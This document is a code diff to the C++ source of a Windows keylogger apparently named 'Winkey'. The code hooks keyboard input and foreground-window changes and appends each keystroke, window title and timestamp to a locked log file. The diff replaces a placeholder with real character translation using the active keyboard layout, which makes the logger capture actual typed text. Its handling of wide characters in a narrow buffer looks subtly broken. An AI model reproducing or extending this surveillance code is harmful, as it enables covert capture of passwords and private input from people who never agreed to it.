@@ -6,18 +6,25 @@ Winkey::Winkey() {
 		LOG_FILE,
 		FILE_GENERIC_WRITE,
 		0,
-		NULL,
+		nullptr,
 		OPEN_ALWAYS,
 		FILE_ATTRIBUTE_NORMAL,
-		NULL
+		nullptr
 	);
 	if (gLogHandle == INVALID_HANDLE_VALUE) {
 		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
 	}
 
-	OVERLAPPED overlap = {0};
+	/* Place file ptr to FILE_END*/
+	LARGE_INTEGER size;
+	GetFileSizeEx(gLogHandle, &size);
+	LARGE_INTEGER size2;
+	LARGE_INTEGER offset;
+	ZeroMemory(&offset, sizeof offset);
+	SetFilePointerEx(gLogHandle, offset, &size2, FILE_END);
 
 	/* Place an exclusive flock on the logfile */
+	OVERLAPPED overlap = { 0 };
 	if (!LockFileEx(
 		gLogHandle,
 		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
@@ -51,7 +58,7 @@ int Winkey::Hook() {
 	HWINEVENTHOOK winHook = SetWinEventHook(
 		EVENT_SYSTEM_FOREGROUND,
 		EVENT_SYSTEM_FOREGROUND,
-		NULL,
+		nullptr,
 		(WINEVENTPROC) & Winkey::onWindow,
 		0,
 		0,
@@ -100,11 +107,11 @@ LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		logCurrentWindow();
 
 		/* Solving key */
-		const char* data = solve(kbdEv);
+		const std::string to_write = solve(kbdEv);
 
 		/* Writing key to file */
 		DWORD bytesWrote;
-		WriteFile(gLogHandle, data, std::strlen(data), &bytesWrote, NULL);
+		WriteFile(gLogHandle, to_write.c_str(), to_write.length(), &bytesWrote, NULL);
 	}
 
 	/* Forward to next hooks ... */
@@ -141,40 +148,42 @@ LRESULT CALLBACK Winkey::onWindow(HWINEVENTHOOK hWinEventHook,
 	return 0;
 }
 
-const char *Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
+std::string Winkey::solve(KBDLLHOOKSTRUCT *kbdEv) {
 	switch (kbdEv->vkCode) {
-	case VK_BACK:		return "[BACKSPACE]";
-	case VK_ESCAPE:		return "[ESC]";
-	case VK_DELETE:		return "[DELETE]";
-	case VK_LEFT:		return "[LEFTARROW]";
-	case VK_UP:			return "[UPARROW]";
-	case VK_RIGHT:		return "[RIGHTARROW]";
-	case VK_DOWN:		return "[DOWNARROW]";
-	case VK_SPACE:		return " ";
-	case VK_TAB:		return "[TAB]";
-	case VK_CAPITAL:	return "[CAPSLOCK]";
+	case VK_BACK:		return std::string("[BACKSPACE]");
+	case VK_ESCAPE:		return std::string("[ESC]");
+	case VK_DELETE:		return std::string("[DELETE]");
+	case VK_LEFT:		return std::string("[LEFTARROW]");
+	case VK_UP:			return std::string("[UPARROW]");
+	case VK_RIGHT:		return std::string("[RIGHTARROW]");
+	case VK_DOWN:		return std::string("[DOWNARROW]");
+	case VK_SPACE:		return std::string(" ");
+	case VK_TAB:		return std::string("[TAB]");
+	case VK_CAPITAL:	return std::string("[CAPSLOCK]");
 	case VK_SHIFT:
 	case VK_LSHIFT:
-	case VK_RSHIFT:		return "[SHIFT]";
+	case VK_RSHIFT:		return std::string("[SHIFT]");
 	case VK_CONTROL:
 	case VK_LCONTROL:
-	case VK_RCONTROL:	return "[CTRL]";
-	case VK_RETURN:		return "\\n";
+	case VK_RCONTROL:	return std::string("[CTRL]");
+	case VK_RETURN:		return std::string("\\n");
 	default:
 		BYTE keyboardState[256];
 		GetKeyboardState(keyboardState);
 
 		CHAR unicodeBuffer[16] = {0};
-		ToUnicode(
+		ToUnicodeEx(
 			kbdEv->vkCode,
 			kbdEv->scanCode,
 			keyboardState,
 			reinterpret_cast<LPWSTR>(unicodeBuffer),
 			8,
-			0
+			0,
+			GetKeyboardLayout(0)
 		);
 
-		return "A";
+		std::string fmt(unicodeBuffer);
+		return fmt;
 	}
 }
 
@@ -192,11 +201,11 @@ void Winkey::logCurrentWindow() {
 	localtime_s(&new_time, &t);
 
 	/* Formatting time */
-	char mbstr[100 + sizeof(gLastWindowTitle)] = {0};
-	std::strftime(mbstr, sizeof(mbstr), "%d.%m.%Y %H:%M:%S", &new_time);
+	char mbstr[100 + sizeof gLastWindowTitle] = {0};
+	std::strftime(mbstr, sizeof mbstr, "%d.%m.%Y %H:%M:%S", &new_time);
 
 	/* Preparing payload to write, with time and lastWindowTitle */
-	const std::string to_write = std::format("\n[{}] - '{}'\n", mbstr, gLastWindowTitle);
+	std::string to_write = std::format("\n[{}] - '{}'\n", mbstr, gLastWindowTitle);
 
 	/* Writing payload to file */
 	DWORD bytesWrote;
